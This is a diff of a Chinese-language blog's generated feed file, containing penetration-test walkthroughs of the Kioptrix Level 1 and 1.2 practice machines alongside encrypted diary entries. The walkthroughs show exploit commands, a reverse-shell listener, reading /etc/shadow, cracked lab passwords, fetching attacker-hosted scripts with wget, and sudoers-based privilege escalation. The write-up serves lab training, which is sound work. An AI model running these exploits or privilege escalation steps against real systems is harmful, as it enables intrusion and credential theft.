</span><br><span class="line">-p        port to attack (default = 139)                                                                                  </span><br><span class="line">-r         return address                                                                                                  </span><br><span class="line">-s              scan mode (random)                                                                                              </span><br><span class="line">-S     scan mode                                                                                                       </span><br><span class="line">-t        presets (0 for a list)                                                                                          </span><br><span class="line">-v              verbose mode     </span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>根据提示：<code>./10 -b 0 192.168.89.132</code></p>
-</li>
-</ul>
-<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8810.29.37.png" alt="截屏2024-01-29_下午10.29.37" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<h3 id="思路2-mod_ssl284-端口443"><a class="markdownIt-Anchor" href="#思路2-mod_ssl284-端口443"></a> 思路2 ——mod_ssl/2.8.4 端口443</h3>
-<h4 id="版本信息"><a class="markdownIt-Anchor" href="#版本信息"></a> 版本信息</h4>
-<p>这里nmap把版本写的很清楚：443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</p>
-<h4 id="寻找exploit-2"><a class="markdownIt-Anchor" href="#寻找exploit-2"></a> 寻找exploit</h4>
-<ul>
-<li><code>searchsploit mod_ssl 2.8.4</code></li>
-</ul>
-<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.33.13.png" alt="截屏2024-01-29_下午11.33.13" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><strong>挑选一个数值更大的文件：47080.c</strong></p>
-<ul>
-<li><code>searchsploit -x unix/remote/47080.c</code></li>
-</ul>
-<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.35.09.png" alt="截屏2024-01-29_下午11.35.09" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><strong>仔细看注释，里面写了requirements和编译命令</strong></p>
-<h4 id="编译和运行脚本-2"><a class="markdownIt-Anchor" href="#编译和运行脚本-2"></a> 编译和运行脚本</h4>
-<p>这个步骤其实就是根据提示补全命令，运行脚本后，可以直接拿到root（理论上）。</p>
-<p>事实上，我尝试了很久，大概在七八次的时候才拿到root（碰运气）</p>
-<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.29.06.png" alt="截屏2024-01-29_下午11.29.06" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p>在此之前都是拿到一个普通用户apache的权限，因此，我学习了一些提权知识，详见<code>学习总结——关于Linux提权</code>。</p>
-<h2 id="学习总结"><a class="markdownIt-Anchor" href="#学习总结"></a> 学习总结</h2>
-<h3 id="关于samba"><a class="markdownIt-Anchor" href="#关于samba"></a> 关于Samba</h3>
-<p>Samba 是在 Linux 和 UNIX 系统上实现 SMB 协议的一个免费软件，由服务器及客户端程序构成。Samba 是能够在任何支持 SMB 协议的主机之间共享文件的一种实现，当然也包括 windows。SMB 是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。SMB 协议是 C/S 型协议，客户机通过该协议可以访问服务器上的共享文件系统、打印机及其他资源。</p>
-<h3 id="关于msf的auxiliary"><a class="markdownIt-Anchor" href="#关于msf的auxiliary"></a> 关于MSF的Auxiliary</h3>
-<p>auxiliary 本身意思为辅助的</p>
-<p>在msf中代表辅助探测模块：该模块不会直接在攻击机和靶机之间建立访问，它们只负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试。</p>
-<p><strong>本次渗透测试用于查询smb服务版本</strong></p>
-<h3 id="关于linux-提权部分"><a class="markdownIt-Anchor" href="#关于linux-提权部分"></a> 关于Linux 提权（部分）</h3>
-<p>此处是因为一点小bug，脚本在运行的时候wget不稳定，导致提权脚本没拉到本地，因此没有成功，只有一个普通用户的权限。</p>
-<p>在遇到这个问题的时候，我顺便学习了一点提权知识：</p>
-<ul>
-<li>利用linux内核版本信息（uname -a在靶机上查看），然后在攻击机上搜索exploit</li>
-<li>通过爆破脚本，暴力破解root密码</li>
-</ul>
-<p>但提权过程基本是：<strong>寻找exploit或相关脚本，通过在攻击机上开启apache服务，将脚本上传到/var/www/html之中，然后靶机通过wget <a href="http://xn--ip-6c5c234ebjc/%E7%9B%AE%E6%A0%87%E8%84%9A%E6%9C%AC">http://攻击机ip/目标脚本</a> 拿到本地执行</strong></p>
-]]></content>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Mad1sun_bad_days</title>
+      <link href="/2024/02/29/Mad1sun-bad-days/"/>
+      <url>/2024/02/29/Mad1sun-bad-days/</url>
+      
+        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="不正确，再试一次～" data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="d59232ae0f378b963d8c772b71de1f03b49492f95ffd4dc880d46400c9cf6138">8c76022e97a58cf7bdb38a6c611ba5afe6d77c112047be7c42efabbb76a9fb8dbd04bc8ccbb3a9625e7be09a9e5faa35630b53d5be810900b2c1192bdcf6a1631c71601c78b6bed90420d6b14090533b11332bcac29ec2655f2663641f0397770515a72dab90a52dc06d569b513c8323a7c78df3bbadd47393370eb40053e8a0e1671c30434d5415f6387e73141440fb40f5d08a11360d56389a1a361095650267fba5a0aba38a80ff0207298fe206a566fda88abff97340960fef5f7791e3d3ace852e0b91e43b3ae703f5503d8be3021585ba0652404b834b4939f63fd66707b73a6ff60db8ae8f295101f6046935d38da57f13be46c39038c5395b899b19306ff59887bd889e908cf154030c921727dc9bf5c4c98b84f3536f62b76b0d50975e16a1fb1c436b865e8423e36f70c22619f577797a7ea36cede8f0ed8b1a7829a1e17e2f77325d3c3bc7c37cb38a7d5af651af36a1f3e0170a08c0c579e4b1fc81f1f1b623bf3f8918212b629ee28745ccc98b73f6f80fb9836830c07bda5616757aa3c8dfaaf35be34e87f50f00bff24ca8eb6b4c830f472dd23cf9dce7b58e5b140295bfae8e85de041e1be76edd7</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      
+      
       <categories>
-        <category>类OSCP靶机练习</category>
+          
+          <category> Mad1sun的生活小日记 </category>
+          
       </categories>
-      <tags>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Mad1sun_bad_days</title>
-    <url>/2024/02/29/Mad1sun-bad-days/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="不正确，再试一次～" data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="d59232ae0f378b963d8c772b71de1f03b49492f95ffd4dc880d46400c9cf6138">8c76022e97a58cf7bdb38a6c611ba5afe6d77c112047be7c42efabbb76a9fb8dbd04bc8ccbb3a9625e7be09a9e5faa35630b53d5be810900b2c1192bdcf6a1631c71601c78b6bed90420d6b14090533b11332bcac29ec2655f2663641f0397770515a72dab90a52dc06d569b513c8323a7c78df3bbadd47393370eb40053e8a0e1671c30434d5415f6387e73141440fb40f5d08a11360d56389a1a361095650267fba5a0aba38a80ff0207298fe206a566fda88abff97340960fef5f7791e3d3ace852e0b91e43b3ae703f5503d8be3021585ba0652404b834b4939f63fd66707b73a6ff60db8ae8f295101f6046935d38da57f13be46c39038c5395b899b19306ff59887bd889e908cf154030c921727dc9bf5c4c98b84f3536f62b76b0d50975e16a1fb1c436b865e8423e36f70c22619f577797a7ea36cede8f0ed8b1a7829a1e17e2f77325d3c3bc7c37cb38a7d5af651af36a1f3e0170a08c0c579e4b1fc81f1f1b623bf3f8918212b629ee28745ccc98b73f6f80fb9836830c07bda5616757aa3c8dfaaf35be34e87f50f00bff24ca8eb6b4c830f472dd23cf9dce7b58e5b140295bfae8e85de041e1be76edd7</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      
+      
+        <tags>
+            
+            <tag> Mad1sun倒霉蛋的日常 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Kioptrix Level 1.2(#3)</title>
+      <link href="/2024/02/11/Kioptrix_Level_1.2/"/>
+      <url>/2024/02/11/Kioptrix_Level_1.2/</url>
+      
+        <content type="html"><![CDATA[<h1 id="kioptrix-level-123"><a class="markdownIt-Anchor" href="#kioptrix-level-123"></a> Kioptrix Level 1.2(#3)</h1><h2 id="渗透思路"><a class="markdownIt-Anchor" href="#渗透思路"></a> 渗透思路</h2><h3 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h3><ul><li>nmap扫描ip，得到IP为<code>192.168.89.139</code></li><li>nmap扫描端口以及端口服务</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-11 00:12 EST</span><br><span class="line">Nmap scan report for 192.168.89.139</span><br><span class="line">Host is up (0.0025s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 12.49 seconds</span><br></pre></td></tr></table></figure><p>发现开放了ssh和http服务</p><ul><li>浏览器访问<code>http://192.168.89.139</code></li></ul><img src="/2024/02/11/Kioptrix_Level_1.2/截屏2024-02-13_下午8.24.57.png" alt="截屏2024-02-13_下午8.24.57" style="zoom:67%;" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'><ul><li>点击Login，发现一个登录界面，<code>Proudly Powered by:LotusCMS</code>，<strong>LotusCMS</strong>是关键，CMS（Content  Management System 内容管理系统）</li></ul><p><img src="/2024/02/11/Kioptrix_Level_1.2/%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%888.25.32.png" alt="截屏2024-02-13_下午8.25.32" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><em>看到登录框，想起上一道题，可能存在sql注入</em></p><ul><li>dirsearch扫描网址：<code>dirsearch --url http://192.168.89.139</code></li></ul><p><img src="/2024/02/11/Kioptrix_Level_1.2/%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%888.36.19.png" alt="截屏2024-02-13_下午8.36.19" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><strong>发现了一个phpmyadmin，还有一个gallery</strong></p><ul><li>查看<code>http://192.168.89.139/phpmyadmin/</code>，<strong>需要拿到root密码</strong></li></ul><p><img src="/2024/02/11/Kioptrix_Level_1.2/%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%889.57.06.png" alt="截屏2024-02-13_下午9.57.06" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><em>由之前信息收集阶段的结果可知 phpmyadmin 的版本为 <strong>2.11.3</strong>，搜索可知该版本存在&quot;万能密码&quot;,使用 <strong>‘localhost’@'@&quot;</strong> 即可登陆，但是只有一个 <strong>information_schema</strong> ，没什么用</em></p><blockquote><p><a href="https://bulletforkiller.github.io/post/2020-07-31-vulnhub-kioptrixvm3/#lotuscms">Vulnhub-KioptrixVM3 - Josephine’s Blog (bulletforkiller.github.io)</a></p></blockquote><ul><li>查看<code>http://192.168.89.139/gallery/</code>，dirsearch扫一下目录</li></ul><p><img src="/2024/02/11/Kioptrix_Level_1.2/%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%888.58.54.png" alt="截屏2024-02-13_下午8.58.54" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>发现了一个后台/gallery/gadmin，<strong>Username为admin</strong>，一个db.sql文件<img src="/2024/02/11/Kioptrix_Level_1.2/%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%889.00.18.png" alt="截屏2024-02-13_下午9.00.18" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></li></ul><p><strong>后台可以尝试sql注入</strong></p><p><strong>db.sql部分文件内容如下：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS `gallarific_users` (</span><br><span class="line">  `userid` int(11) NOT NULL auto_increment,</span><br><span class="line">  `username` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `password` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `usertype` enum(&#x27;superuser&#x27;,&#x27;normaluser&#x27;) NOT NULL default &#x27;superuser&#x27;,</span><br><span class="line">  `firstname` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `lastname` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `email` varchar(255) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `datejoined` int(11) NOT NULL default &#x27;0&#x27;,</span><br><span class="line">  `website` varchar(255) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `issuperuser` tinyint(4) NOT NULL default &#x27;0&#x27;,</span><br><span class="line">  `photo` varchar(100) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  `joincode` varchar(20) NOT NULL default &#x27;&#x27;,</span><br><span class="line">  PRIMARY KEY  (`userid`)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h4 id="总结突破方向cmsweb"><a class="markdownIt-Anchor" href="#总结突破方向cmsweb"></a> 总结突破方向——cms+web</h4><ul><li><p>Login是否存在sql注入</p></li><li><p>LotusCMS 是否存在可利用的漏洞</p></li><li><p>是否能拿到phpmyadmin后台的root用户密码，查看数据库信息</p></li><li><p>/gallery/gadmin是否存在sql注入</p></li></ul><h3 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h3><h4 id="lotuscms漏洞利用"><a class="markdownIt-Anchor" href="#lotuscms漏洞利用"></a> lotusCMS漏洞利用</h4><ul><li><p>在github中找到python利用的lotuscms3.0RCE漏洞：<a href="https://github.com/nguyen-ngo/LotusCMS-3.0-RCE-exploit">https://github.com/nguyen-ngo/LotusCMS-3.0-RCE-exploit</a></p></li><li><p>nc监听444端口:<code> nc -nvlp 444</code>，同时执行<code> python lotuscms.py -rh 192.168.89.139 -lh 192.168.89.137</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-h, --help  show this help message and exit.</span><br><span class="line">-rh RHOST   Target Host.</span><br><span class="line">-rp RPORT   Target Port. Default: 80.</span><br><span class="line">-u URI      URI (i.e /lms/. Default: /</span><br><span class="line">-lh LHOST   Local Host.</span><br><span class="line">-lp LPORT   Local Port. Default: 444</span><br><span class="line">-s          SSL/TLS enable (True/False). Default: False</span><br></pre></td></tr></table></figure><p><img src="/2024/02/11/Kioptrix_Level_1.2/image-20240229153523165.png" alt="image-20240229153523165" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><strong>成功拿到www-data，但是这只是一个普通用户权限，由于我们扫出了重要的网站后台，先利用这个用户权限，查看网站源文件，看是否存在敏感信息</strong></p></li><li><p>通过www-data，我们可以查看/etc/passwd /etc/shadow，这些信息，<em>里面能看到后面能查到的dreg和loneferret两个用户</em></p></li><li><p>在网页根目录中查找敏感信息，通过<code>cat gconfig.php</code>成功看到mysql的username和password，可以直接登录phpmyadmin了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS[&quot;gallarific_mysql_server&quot;] = &quot;localhost&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_database&quot;] = &quot;gallery&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_username&quot;] = &quot;root&quot;;</span><br><span class="line">$GLOBALS[&quot;gallarific_mysql_password&quot;] = &quot;fuckeyou&quot;;</span><br></pre></td></tr></table></figure></li><li><p>拿到phpmyadmin后台root密码后，登录后台，看到一些<strong>数据库信息</strong></p></li></ul><p><img src="/2024/02/11/Kioptrix_Level_1.2/%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%888.34.41.png" alt="截屏2024-02-13_下午8.34.41" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>可以看到我们要找的gallery数据库，gallarific_users这张表，也就是gallery/gadmin后台的登录用户名和密码</li></ul><p><img src="/2024/02/11/Kioptrix_Level_1.2/%E6%88%AA%E5%B1%8F2024-02-13_%E4%B8%8B%E5%8D%889.15.57.png" alt="截屏2024-02-13_下午9.15.57" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><strong>拿到password <code>n0t7t1k4</code></strong></p><p>利用<code>admin </code>和<code>n0t7t1k4</code>登录网站后台gallery/gadmin，但是发现网站里面，没有什么特别的东西，<em>其实可以看到一些上传功能和评论功能，可以试试，这里不赘述。</em></p><ul><li>继续翻找phpmyadmin，发现了一个叫做dev_accounts的表，里面存了username和password，这两个用户我们在之前通过www-data，查看用户列表时看到过，因此如果破解了密码可以利用<code>ssh</code>登录</li></ul><p><img src="/2024/02/11/Kioptrix_Level_1.2/image-20240229194301766.png" alt="image-20240229194301766" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>通过<code>md5</code>解密，得到账户信息 [md5在线解密](<a href="https://www.cmd5.com/default.aspx?hashtype=md5&amp;answer=cWluZ21pbmcxMTI0MTUu">md5在线解密破解,md5解密加密 (cmd5.com)</a>)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dreg Mast3r</span><br><span class="line">loneferret starwars</span><br></pre></td></tr></table></figure><p><em>看到别人的walkthrough发现这里也可以hydra爆破，详情请看  <a href="https://bulletforkiller.github.io/post/2020-07-31-vulnhub-kioptrixvm3/#phpmyadmin">Vulnhub-KioptrixVM3 - Josephine’s Blog (bulletforkiller.github.io)</a></em></p><ul><li>目标主机开了ssh服务，尝试利用ssh登录</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -o KexAlgorithms=diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-dss dreg@192.168.89.139</span><br><span class="line">ssh -o KexAlgorithms=diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-dss loneferret@192.168.89.139</span><br></pre></td></tr></table></figure><p><em>直接ssh，会导致报错，原因大概是对方使用的ssh版本比较低，详情请看<a href="https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss">SSH 返回：未找到匹配的主机密钥类型。他们的报价：ssh-dss - 询问 Ubuntu (askubuntu.com)</a></em></p><h4 id="简单查看两个用户的权限"><a class="markdownIt-Anchor" href="#简单查看两个用户的权限"></a> 简单查看两个用户的权限</h4><ul><li><code>sudo -l</code> 查看当前用户有哪些被sudo服务授权的命令，<strong>可以发现loneferret下ht和su</strong></li></ul><p><img src="/2024/02/11/Kioptrix_Level_1.2/image-20240229202721535.png" alt="image-20240229202721535" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><em>按理说，我们直接<code>sudo su root</code>就可以直接切换成root，但是发现su的路径貌似写错了，正确的应该是<code>/bin/su</code></em></p><p><img src="/2024/02/11/Kioptrix_Level_1.2/Screenshot2024-02-29_21.03.16.png" alt="Screenshot2024-02-29_21.03.16" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><h5 id="提权思路"><a class="markdownIt-Anchor" href="#提权思路"></a> 提权思路</h5><ul><li><p>利用内核信息提权</p></li><li><p>SUID提权：直接利用<code>sudo ht</code>编辑<code>/etc/sudoers</code>文件提权</p></li></ul><h3 id="权限提升-privilege-escalation"><a class="markdownIt-Anchor" href="#权限提升-privilege-escalation"></a> 权限提升 privilege escalation</h3><h4 id="利用les工具内核提权"><a class="markdownIt-Anchor" href="#利用les工具内核提权"></a> 利用LES工具内核提权</h4><blockquote><p><a href="https://github.com/The-Z-Labs/linux-exploit-suggester">The-Z-Labs/linux-exploit-suggester：Linux 权限升级审计工具 (github.com)</a></p><p>LES 工具旨在帮助检测给定 Linux 内核/基于 Linux 的机器的安全缺陷。</p></blockquote><ul><li>利用les工具，查看系统是否有漏洞</li></ul><p><img src="/2024/02/11/Kioptrix_Level_1.2/image-20240229161417872.png" alt="image-20240229161417872" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li><p>先通过<code>uname -a</code>查看系统信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU /Linux  </span><br></pre></td></tr></table></figure></li><li><p>在kali中<code>bash ./les.sh --uname &quot;Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux&quot;</code></p></li></ul><p><img src="/2024/02/11/Kioptrix_Level_1.2/image-20240229162455063.png" alt="image-20240229162455063" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>发现可以直接用脏牛，但具体没实现出来，因为两个用户都有很多权限限制<ul><li>可以利用msf中的后渗透meterpreter上传，<em>但由于oscp限制msf的使用，这里不叙述，感兴趣的可以查看这篇文章的内核提权部分 <a href="https://bulletforkiller.github.io/post/2020-07-31-vulnhub-kioptrixvm3/#phpmyadmin">Vulnhub-KioptrixVM3 - Josephine’s Blog (bulletforkiller.github.io)</a></em></li></ul></li></ul><h4 id="suid提权"><a class="markdownIt-Anchor" href="#suid提权"></a> SUID提权</h4><blockquote><p>关于SUID提权的介绍与总结：<a href="https://cloud.tencent.com/developer/article/1878212">对Linux—suid提权的一些总结-腾讯云开发者社区-腾讯云 (tencent.com)</a></p></blockquote><ul><li>查看ht是否具有suid，<code>ls -al /usr/local/bin/ht</code>，发现rws，s表示具有suid，果然</li><li>直接<code>ht</code>，修改<code>/etc/sudoers</code>，添加<code>/bin/bash</code>或修改su的路径为<code>!/bin/su</code></li><li>这里我的kali很奇怪，直接ht里面修改会导致<strong>segmentation fault</strong>，只能通过<code>sudo ht /etc/sudoers</code>，而且得改二进制才行😓，搞了很久🤮。最后直接把lonferret改成了ALL=（ALL）ALL</li></ul><p><img src="/2024/02/11/Kioptrix_Level_1.2/image-20240229221121593.png" alt="image-20240229221121593" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>然后就直接<code>sudo su root</code>，<strong>成功拿到root</strong></li></ul><p><img src="/2024/02/11/Kioptrix_Level_1.2/image-20240229221244697.png" alt="image-20240229221244697" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><h2 id="参考列表"><a class="markdownIt-Anchor" href="#参考列表"></a> 参考列表</h2><blockquote><p><a href="https://bulletforkiller.github.io/post/2020-07-31-vulnhub-kioptrixvm3/#phpmyadmin">Vulnhub-KioptrixVM3 - Josephine’s Blog (bulletforkiller.github.io)</a></p></blockquote><blockquote><p><a href="https://www.cnblogs.com/wsec/p/vulhub0x03.html">0×03 Vulnhub 靶机渗透总结之 KIOPTRIX: LEVEL 1.2 (#3) SQL注入+sudo提权 - wsec - 博客园 (cnblogs.com)</a></p></blockquote><blockquote><p><a href="https://github.com/The-Z-Labs/linux-exploit-suggester">The-Z-Labs/linux-exploit-suggester：Linux 权限升级审计工具 (github.com)</a></p></blockquote><blockquote><p><a href="https://cloud.tencent.com/developer/article/1878212">对Linux—suid提权的一些总结-腾讯云开发者社区-腾讯云 (tencent.com)</a></p></blockquote>]]></content>
+      
+      
       <categories>
-        <category>Mad1sun的生活小日记</category>
+          
+          <category> 类OSCP靶机练习 </category>
+          
       </categories>
-      <tags>
-        <tag>Mad1sun倒霉蛋的日常</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Mad1sun&#39;s_diary</title>
-    <url>/2024/03/04/Mad1sun-s-diary/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="不正确，再试一次～" data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="93bed56989928bfd1702396721f47ceb8df71478bd21cfbc5b4cc75c530fc856">8c76022e97a58cf7bdb38a6c611ba5afe6d77c112047be7c42efabbb76a9fb8dbe94d7f737c5cd469505c4a4f08a7b6f667c2bcc7e8bcc1101e50b7049df7119e647972283f72285032891ec52e4ea75b276910eb2508d5794abd40c1ec3fe8148c18273ed597fedbca724526f92718026004fff4b812dcc2ec3f03465f7c7ac6c21caea4297e2b32b115722f5d44753008bb543edd37b1b1bc29078a6e5e17be7c28371b6c513308a0ccd522518e5bb609ae83439720b93bda58d62d8d10877e0ec9523e7506ec85f48cfbcc08d040eb161198f8cdc01df05a817597c0240d56e192c6d6ec1f937ec175be9857ecd12eef8e22fc5d25954af4e95d7d19fbb6ffb6d2ac522594715497c641906e695e8e1d78c2fa97359d23a15916941416fe1f053bd58001295bc0ec7c641acc974f71181e8d2b19485be8ab18142c65cb61aaa42893e4ae6f4b57790559c210199e6c94f8ad8e2e9ef50dde5a920082c9b74dcfc77e176760ae12cbf92a7e2f16840ec47baddf556a3c56f2a671b2fc66f834aece8e27718d2237158c0ecfa58c5bc8283c81a821c419b13f614f057a351a4fb8d7f64d9a9099b4e53a2ac8d97515007e65ea46669d18dbabba2bbf62932cc1c4fced8f5975e00b790c028bee0c56ba028fc2b369435145ac22b763509ed62a901a25700d19acf3745fdd32d5db4d875f4bb70192b9247be22a1e9c8e99a166eae017af46b567aa8ba338e981e46193c2b9f5a5cd4015480e9b3d57a26154a8ad747d8229158a6f49e56dd98fe683d207a2fb608b17be8e2b015b6f2d57397e7b8d42808effdd096d28fe92066b7691c3ea99aefc6b19fad85475ff4581f4ae4a1915e9cb308655a17973c6a0a85415280a05cad9be0c0089e92a01d8bf7c65509890c8e4c6f13a95ad9fe3311cf9739ee60f167b43a145f6c236c9e676ca2a2f0061fcfc453433349469520997d460269dbe7ca5c9de010e1ba85021de577e559562e447b11ec739e6c3840adc8f0beacf1617602e08043ef938c7de7521d471f820b7a47b242d660f42ae53da2018c51b6f9ca681af2c44e48dfd6db15845ade04cad1be5ef31efc4a64e72f4e590b608dab3ddc0ba1cbaf73aef7075eddd386d29a401d7cf16960ffb717f44dd134dc4e8e656e7aa45753350788f3b8a609937b1f6bb33ec5d91fabca8daf6d9556643876e229a734df585732580499b94153bbe34ac938208b85832722cc7683d44bc00a2d26c3b810d2e80801ef9f31ea1d0ba1beec386f22fddb714d2cdbd16b0ed894ee8036a176e9823752e58178367810c935efe1db263de27fadd8a50c70d180a42b0a01bca214cab6cb38f147ebf4be9a59e74f911d2feddd543cb409f9fcae7ea492a1048a771e5a0acd7641a23e8abab0b258e5d9d6884c14c5afaed7e1e1ee9fd814c85f557ac058e3206d2aa74ce44849dd590c9c7f9d1855d21a74d08361303970dae8b1ca987d2680a1b4be63a88ccade0052f2e9f2d53d836e77c9865a8226f1fcbe809e24f1ddd5aeed864a05916ec491840b822ae62f7f6895bfced50132a038ecccc44d0db7f0aa0f16034fb75667566015e510aec0ca6b21cd0f3323ff266d695ea63fcdb003dff509ad8363d855268f6710985e5eb8b19f71263407887812ae82540df1973c2c13eae790c1b93061e8d81817780fbebdc756213beccfec8905d681ef60783360884995f975c34f61602f9524800f61d6fe7ed90836915a962a0f7dce3a3d9df18037514b750d42902faaee62b28081863b5c03da75713e2001c187d5262056